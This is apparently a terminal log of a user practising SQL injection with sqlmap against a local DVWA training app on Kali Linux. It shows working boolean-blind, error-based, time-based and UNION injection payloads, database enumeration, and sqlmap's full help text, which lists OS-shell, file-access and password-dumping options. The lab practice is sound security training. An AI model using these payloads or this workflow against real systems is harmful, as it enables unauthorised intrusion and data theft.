@@ -1,0 +1,1454 @@
+┌──(root㉿kali)-[~]
+└─# bash pentestlab.sh start dvwa
+bash: pentestlab.sh: No such file or directory
+                                                                             
+┌──(root㉿kali)-[~]
+└─# ls
+pentestlab
+                                                                             
+┌──(root㉿kali)-[~]
+└─# cd pentestlab
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# bash pentestlab.sh start dvwa
+Starting Damn Vulnerable Web Appliaction
+Adding dvwa to your /etc/hosts
+grep: /etc/hosts: binary file matches
+Failed to Add dvwa, Try again!
+Running command: docker start dvwa
+dvwa
+DONE!
+
+Docker mapped to http://dvwa or http://127.8.0.1
+
+Default username/password:   admin/password
+Remember to click on the CREATE DATABASE Button before you start
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --banner
+        ___
+       __H__                                                                 
+ ___ ___[']_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . [)]     | .'| . |                                                    
+|___|_  ["]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:20:35 /2026-02-21/
+
+[14:20:35] [INFO] resuming back-end DBMS 'mysql' 
+[14:20:35] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://127.8.0.1/login.php'. Do you want to follow? [Y/n] y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 1503=1503#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5558 FROM(SELECT COUNT(*),CONCAT(0x716a787a71,(SELECT (ELT(5558=5558,1))),0x7170717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ubKb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1627 FROM (SELECT(SLEEP(5)))nsbR)-- qhcw&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a787a71,0x75564858695a4a765a626d4d7a66685848527564746d655846486979746478716674537569636468,0x7170717171)#&Submit=Submit
+---
+[14:20:38] [INFO] the back-end DBMS is MySQL
+[14:20:38] [INFO] fetching banner
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] y
+[14:20:40] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25, PHP
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[14:20:40] [INFO] fetching banner
+[14:20:40] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[14:20:40] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.8.0.1'                                                    
+
+[*] ending @ 14:20:40 /2026-02-21/
+
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --banner --current-db
+        ___
+       __H__                                                                 
+ ___ ___[)]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . [']     | .'| . |                                                    
+|___|_  ["]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:21:09 /2026-02-21/
+
+[14:21:09] [INFO] resuming back-end DBMS 'mysql' 
+[14:21:09] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://127.8.0.1/login.php'. Do you want to follow? [Y/n] y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 1503=1503#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5558 FROM(SELECT COUNT(*),CONCAT(0x716a787a71,(SELECT (ELT(5558=5558,1))),0x7170717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ubKb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1627 FROM (SELECT(SLEEP(5)))nsbR)-- qhcw&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a787a71,0x75564858695a4a765a626d4d7a66685848527564746d655846486979746478716674537569636468,0x7170717171)#&Submit=Submit
+---
+[14:21:11] [INFO] the back-end DBMS is MySQL
+[14:21:11] [INFO] fetching banner
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] y
+[14:21:12] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)
+web server operating system: Linux Debian 9 (stretch)
+web application technology: PHP, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[14:21:12] [INFO] fetching banner
+[14:21:12] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[14:21:12] [INFO] fetching current database
+[14:21:12] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.8.0.1'                                                    
+
+[*] ending @ 14:21:12 /2026-02-21/
+
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --banner --current-db
+        ___
+       __H__                                                                 
+ ___ ___["]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . [)]     | .'| . |                                                    
+|___|_  [.]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:22:06 /2026-02-21/
+
+[14:22:06] [INFO] resuming back-end DBMS 'mysql' 
+[14:22:06] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://127.8.0.1/login.php'. Do you want to follow? [Y/n] y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 1503=1503#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5558 FROM(SELECT COUNT(*),CONCAT(0x716a787a71,(SELECT (ELT(5558=5558,1))),0x7170717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ubKb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1627 FROM (SELECT(SLEEP(5)))nsbR)-- qhcw&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a787a71,0x75564858695a4a765a626d4d7a66685848527564746d655846486979746478716674537569636468,0x7170717171)#&Submit=Submit
+---
+[14:22:09] [INFO] the back-end DBMS is MySQL
+[14:22:09] [INFO] fetching banner
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] y
+[14:22:10] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)
+web server operating system: Linux Debian 9 (stretch)
+web application technology: PHP, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[14:22:10] [INFO] fetching banner
+[14:22:10] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[14:22:10] [INFO] fetching current database
+[14:22:10] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.8.0.1'                                                    
+
+[*] ending @ 14:22:10 /2026-02-21/
+
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --banner --current-db --dvs
+        ___
+       __H__                                                                 
+ ___ ___[(]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . ["]     | .'| . |                                                    
+|___|_  [(]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+Usage: python3 sqlmap [options]
+
+sqlmap: error: no such option: --dvs
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --banner --current-db --dbs
+        ___
+       __H__                                                                 
+ ___ ___[)]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . [)]     | .'| . |                                                    
+|___|_  [']_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:22:31 /2026-02-21/
+
+[14:22:31] [INFO] resuming back-end DBMS 'mysql' 
+[14:22:31] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://127.8.0.1/login.php'. Do you want to follow? [Y/n] y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 1503=1503#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5558 FROM(SELECT COUNT(*),CONCAT(0x716a787a71,(SELECT (ELT(5558=5558,1))),0x7170717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ubKb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1627 FROM (SELECT(SLEEP(5)))nsbR)-- qhcw&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a787a71,0x75564858695a4a765a626d4d7a66685848527564746d655846486979746478716674537569636468,0x7170717171)#&Submit=Submit
+---
+[14:22:33] [INFO] the back-end DBMS is MySQL
+[14:22:33] [INFO] fetching banner
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] y
+[14:22:33] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)
+web server operating system: Linux Debian 9 (stretch)
+web application technology: PHP, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[14:22:34] [INFO] fetching banner
+[14:22:34] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[14:22:34] [INFO] fetching current database
+[14:22:34] [INFO] fetching database names
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+[14:22:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.8.0.1'                                                    
+
+[*] ending @ 14:22:34 /2026-02-21/
+
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --banner --current-db --dbs --batch
+        ___
+       __H__                                                                 
+ ___ ___[)]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . [.]     | .'| . |                                                    
+|___|_  [(]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:22:45 /2026-02-21/
+
+[14:22:46] [INFO] resuming back-end DBMS 'mysql' 
+[14:22:46] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://127.8.0.1/login.php'. Do you want to follow? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 1503=1503#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 5558 FROM(SELECT COUNT(*),CONCAT(0x716a787a71,(SELECT (ELT(5558=5558,1))),0x7170717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ubKb&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 1627 FROM (SELECT(SLEEP(5)))nsbR)-- qhcw&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a787a71,0x75564858695a4a765a626d4d7a66685848527564746d655846486979746478716674537569636468,0x7170717171)#&Submit=Submit
+---
+[14:22:46] [INFO] the back-end DBMS is MySQL
+[14:22:46] [INFO] fetching banner
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+[14:22:46] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)
+web server operating system: Linux Debian 9 (stretch)
+web application technology: PHP, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[14:22:46] [INFO] fetching banner
+[14:22:46] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[14:22:46] [INFO] fetching current database
+[14:22:46] [INFO] fetching database names
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+[14:22:46] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.8.0.1'                                                    
+
+[*] ending @ 14:22:46 /2026-02-21/
+
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -hh
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . [.]     | .'| . |                                                    
+|___|_  [']_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+Usage: python3 sqlmap [options]
+
+Options:
+  -h, --help            Show basic help message and exit
+  -hh                   Show advanced help message and exit
+  --version             Show program's version number and exit
+  -v VERBOSE            Verbosity level: 0-6 (default 1)
+
+  Target:
+    At least one of these options has to be provided to define the
+    target(s)
+
+    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+    -d DIRECT           Connection string for direct database connection
+    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
+    -m BULKFILE         Scan multiple targets given in a textual file
+    -r REQUESTFILE      Load HTTP request from a file
+    -g GOOGLEDORK       Process Google dork results as target URLs
+    -c CONFIGFILE       Load options from a configuration INI file
+
+  Request:
+    These options can be used to specify how to connect to the target URL
+
+    -A AGENT, --user..  HTTP User-Agent header value
+    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
+    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
+    --data=DATA         Data string to be sent through POST (e.g. "id=1")
+    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
+    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
+    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
+    --live-cookies=L..  Live cookies file used for loading up-to-date values
+    --load-cookies=L..  File containing cookies in Netscape/wget format
+    --drop-set-cookie   Ignore Set-Cookie header from response
+    --http1.0           Use HTTP version 1.0 (old)
+    --http2             Use HTTP version 2 (experimental)
+    --mobile            Imitate smartphone through HTTP User-Agent header
+    --random-agent      Use randomly selected HTTP User-Agent header value
+    --host=HOST         HTTP Host header value
+    --referer=REFERER   HTTP Referer header value
+    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
+    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, Bearer, ...)
+    --auth-cred=AUTH..  HTTP authentication credentials (name:password)
+    --auth-file=AUTH..  HTTP authentication PEM cert/private key file
+    --abort-code=ABO..  Abort on (problematic) HTTP error code(s) (e.g. 401)
+    --ignore-code=IG..  Ignore (problematic) HTTP error code(s) (e.g. 401)
+    --ignore-proxy      Ignore system default proxy settings
+    --ignore-redirects  Ignore redirection attempts
+    --ignore-timeouts   Ignore connection timeouts
+    --proxy=PROXY       Use a proxy to connect to the target URL
+    --proxy-cred=PRO..  Proxy authentication credentials (name:password)
+    --proxy-file=PRO..  Load proxy list from a file
+    --proxy-freq=PRO..  Requests between change of proxy from a given list
+    --tor               Use Tor anonymity network
+    --tor-port=TORPORT  Set Tor proxy port other than default
+    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
+    --check-tor         Check to see if Tor is used properly
+    --delay=DELAY       Delay in seconds between each HTTP request
+    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
+    --retries=RETRIES   Retries when the connection timeouts (default 3)
+    --retry-on=RETRYON  Retry request on regexp matching content (e.g. "drop")
+    --randomize=RPARAM  Randomly change value for given parameter(s)
+    --safe-url=SAFEURL  URL address to visit frequently during testing
+    --safe-post=SAFE..  POST data to send to a safe URL
+    --safe-req=SAFER..  Load safe HTTP request from a file
+    --safe-freq=SAFE..  Regular requests between visits to a safe URL
+    --skip-urlencode    Skip URL encoding of payload data
+    --csrf-token=CSR..  Parameter used to hold anti-CSRF token
+    --csrf-url=CSRFURL  URL address to visit for extraction of anti-CSRF token
+    --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit
+    --csrf-data=CSRF..  POST data to send during anti-CSRF token page visit
+    --csrf-retries=C..  Retries for anti-CSRF token retrieval (default 0)
+    --force-ssl         Force usage of SSL/HTTPS
+    --chunked           Use HTTP chunked transfer encoded (POST) requests
+    --hpp               Use HTTP parameter pollution method
+    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
+                        "import hashlib;id2=hashlib.md5(id).hexdigest()")
+
+  Optimization:
+    These options can be used to optimize the performance of sqlmap
+
+    -o                  Turn on all optimization switches
+    --predict-output    Predict common queries output
+    --keep-alive        Use persistent HTTP(s) connections
+    --null-connection   Retrieve page length without actual HTTP response body
+    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
+
+  Injection:
+    These options can be used to specify which parameters to test for,
+    provide custom injection payloads and optional tampering scripts
+
+    -p TESTPARAMETER    Testable parameter(s)
+    --skip=SKIP         Skip testing for given parameter(s)
+    --skip-static       Skip testing parameters that not appear to be dynamic
+    --param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")
+    --param-filter=P..  Select testable parameter(s) by place (e.g. "POST")
+    --dbms=DBMS         Force back-end DBMS to provided value
+    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
+    --os=OS             Force back-end DBMS operating system to provided value
+    --invalid-bignum    Use big numbers for invalidating values
+    --invalid-logical   Use logical operations for invalidating values
+    --invalid-string    Use random strings for invalidating values
+    --no-cast           Turn off payload casting mechanism
+    --no-escape         Turn off string escaping mechanism
+    --prefix=PREFIX     Injection payload prefix string
+    --suffix=SUFFIX     Injection payload suffix string
+    --tamper=TAMPER     Use given script(s) for tampering injection data
+
+  Detection:
+    These options can be used to customize the detection phase
+
+    --level=LEVEL       Level of tests to perform (1-5, default 1)
+    --risk=RISK         Risk of tests to perform (1-3, default 1)
+    --string=STRING     String to match when query is evaluated to True
+    --not-string=NOT..  String to match when query is evaluated to False
+    --regexp=REGEXP     Regexp to match when query is evaluated to True
+    --code=CODE         HTTP code to match when query is evaluated to True
+    --smart             Perform thorough tests only if positive heuristic(s)
+    --text-only         Compare pages based only on the textual content
+    --titles            Compare pages based only on their titles
+
+  Techniques:
+    These options can be used to tweak testing of specific SQL injection
+    techniques
+
+    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
+    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
+    --disable-stats     Disable the statistical model for detecting the delay
+    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
+    --union-char=UCHAR  Character to use for bruteforcing number of columns
+    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
+    --union-values=U..  Column values to use for UNION query SQL injection
+    --dns-domain=DNS..  Domain name used for DNS exfiltration attack
+    --second-url=SEC..  Resulting page URL searched for second-order response
+    --second-req=SEC..  Load second-order HTTP request from file
+
+  Fingerprint:
+    -f, --fingerprint   Perform an extensive DBMS version fingerprint
+
+  Enumeration:
+    These options can be used to enumerate the back-end database
+    management system information, structure and data contained in the
+    tables
+
+    -a, --all           Retrieve everything
+    -b, --banner        Retrieve DBMS banner
+    --current-user      Retrieve DBMS current user
+    --current-db        Retrieve DBMS current database
+    --hostname          Retrieve DBMS server hostname
+    --is-dba            Detect if the DBMS current user is DBA
+    --users             Enumerate DBMS users
+    --passwords         Enumerate DBMS users password hashes
+    --privileges        Enumerate DBMS users privileges
+    --roles             Enumerate DBMS users roles
+    --dbs               Enumerate DBMS databases
+    --tables            Enumerate DBMS database tables
+    --columns           Enumerate DBMS database table columns
+    --schema            Enumerate DBMS schema
+    --count             Retrieve number of entries for table(s)
+    --dump              Dump DBMS database table entries
+    --dump-all          Dump all DBMS databases tables entries
+    --search            Search column(s), table(s) and/or database name(s)
+    --comments          Check for DBMS comments during enumeration
+    --statements        Retrieve SQL statements being run on DBMS
+    -D DB               DBMS database to enumerate
+    -T TBL              DBMS database table(s) to enumerate
+    -C COL              DBMS database table column(s) to enumerate
+    -X EXCLUDE          DBMS database identifier(s) to not enumerate
+    -U USER             DBMS user to enumerate
+    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
+    --pivot-column=P..  Pivot column name
+    --where=DUMPWHERE   Use WHERE condition while table dumping
+    --start=LIMITSTART  First dump table entry to retrieve
+    --stop=LIMITSTOP    Last dump table entry to retrieve
+    --first=FIRSTCHAR   First query output word character to retrieve
+    --last=LASTCHAR     Last query output word character to retrieve
+    --sql-query=SQLQ..  SQL statement to be executed
+    --sql-shell         Prompt for an interactive SQL shell
+    --sql-file=SQLFILE  Execute SQL statements from given file(s)
+
+  Brute force:
+    These options can be used to run brute force checks
+
+    --common-tables     Check existence of common tables
+    --common-columns    Check existence of common columns
+    --common-files      Check existence of common files
+
+  User-defined function injection:
+    These options can be used to create custom user-defined functions
+
+    --udf-inject        Inject custom user-defined functions
+    --shared-lib=SHLIB  Local path of the shared library
+
+  File system access:
+    These options can be used to access the back-end database management
+    system underlying file system
+
+    --file-read=FILE..  Read a file from the back-end DBMS file system
+    --file-write=FIL..  Write a local file on the back-end DBMS file system
+    --file-dest=FILE..  Back-end DBMS absolute filepath to write to
+
+  Operating system access:
+    These options can be used to access the back-end database management
+    system underlying operating system
+
+    --os-cmd=OSCMD      Execute an operating system command
+    --os-shell          Prompt for an interactive operating system shell
+    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
+    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
+    --os-bof            Stored procedure buffer overflow exploitation
+    --priv-esc          Database process user privilege escalation
+    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
+    --tmp-path=TMPPATH  Remote absolute path of temporary files directory
+
+  Windows registry access:
+    These options can be used to access the back-end database management
+    system Windows registry
+
+    --reg-read          Read a Windows registry key value
+    --reg-add           Write a Windows registry key value data
+    --reg-del           Delete a Windows registry key value
+    --reg-key=REGKEY    Windows registry key
+    --reg-value=REGVAL  Windows registry key value
+    --reg-data=REGDATA  Windows registry key value data
+    --reg-type=REGTYPE  Windows registry key value type
+
+  General:
+    These options can be used to set some general working parameters
+
+    -s SESSIONFILE      Load session from a stored (.sqlite) file
+    -t TRAFFICFILE      Log all HTTP traffic into a textual file
+    --abort-on-empty    Abort data retrieval on empty results
+    --answers=ANSWERS   Set predefined answers (e.g. "quit=N,follow=N")
+    --base64=BASE64P..  Parameter(s) containing Base64 encoded data
+    --base64-safe       Use URL and filename safe Base64 alphabet (RFC 4648)
+    --batch             Never ask for user input, use the default behavior
+    --binary-fields=..  Result fields having binary values (e.g. "digest")
+    --check-internet    Check Internet connection before assessing the target
+    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables
+    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
+    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
+    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
+    --charset=CHARSET   Blind SQL injection charset (e.g. "0123456789abcdef")
+    --dump-file=DUMP..  Store dumped data to a custom file
+    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
+    --encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)
+    --eta               Display for each output the estimated time of arrival
+    --flush-session     Flush session files for current target
+    --forms             Parse and test forms on target URL
+    --fresh-queries     Ignore query results stored in session file
+    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
+    --har=HARFILE       Log all HTTP traffic into a HAR file
+    --hex               Use hex conversion during data retrieval
+    --output-dir=OUT..  Custom output directory path
+    --parse-errors      Parse and display DBMS error messages from responses
+    --preprocess=PRE..  Use given script(s) for preprocessing (request)
+    --postprocess=PO..  Use given script(s) for postprocessing (response)
+    --repair            Redump entries having unknown character marker (?)
+    --save=SAVECONFIG   Save options to a configuration INI file
+    --scope=SCOPE       Regexp for filtering targets
+    --skip-heuristics   Skip heuristic detection of vulnerabilities
+    --skip-waf          Skip heuristic detection of WAF/IPS protection
+    --table-prefix=T..  Prefix used for temporary tables (default: "sqlmap")
+    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
+    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
+    --time-limit=TIM..  Run with a time limit in seconds (e.g. 3600)
+    --unsafe-naming     Disable escaping of DBMS identifiers (e.g. "user")
+    --web-root=WEBROOT  Web server document root directory (e.g. "/var/www")
+
+  Miscellaneous:
+    These options do not fit into any other category
+
+    -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
+    --alert=ALERT       Run host OS command(s) when SQL injection is found
+    --beep              Beep on question and/or when vulnerability is found
+    --dependencies      Check for missing (optional) sqlmap dependencies
+    --disable-coloring  Disable console output coloring
+    --disable-hashing   Disable hash analysis on table dumps
+    --list-tampers      Display list of available tamper scripts
+    --no-logging        Disable logging to a file
+    --no-truncate       Disable console output truncation (e.g. long entr...)
+    --offline           Work in offline mode (only use session data)
+    --purge             Safely remove all content from sqlmap data directory
+    --results-file=R..  Location of CSV results file in multiple targets mode
+    --shell             Prompt for an interactive sqlmap shell
+    --tmp-dir=TMPDIR    Local directory for storing temporary files
+    --unstable          Adjust options for unstable connections
+    --update            Update sqlmap
+    --wizard            Simple wizard interface for beginner users
+                                                                             
+┌──(root㉿kali)-[~/pentestlab]
+└─# sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie = 'PHPSESSID=hr9ugqoejj7lb1qsg2ti3igqt2; security=low' --wizard 
+        ___
+       __H__                                                                 
+ ___ ___[)]_____ ___ ___  {1.9.11#stable}                                    
+|_ -| . [)]     | .'| . |                                                    
+|___|_  [.]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:23:30 /2026-02-21/
+
+[14:23:30] [INFO] starting wizard interface
+POST data (--data) [Enter for None]: 
+
+Injection difficulty (--level/--risk). Please choose:
+[1] Normal (default)
+[2] Medium
+[3] Hard
+> 
+
+Enumeration (--banner/--current-user/etc). Please choose:
+[1] Basic (default)
+[2] Intermediate
+[3] All
+> 
+
+
+sqlmap is running, please wait..
+
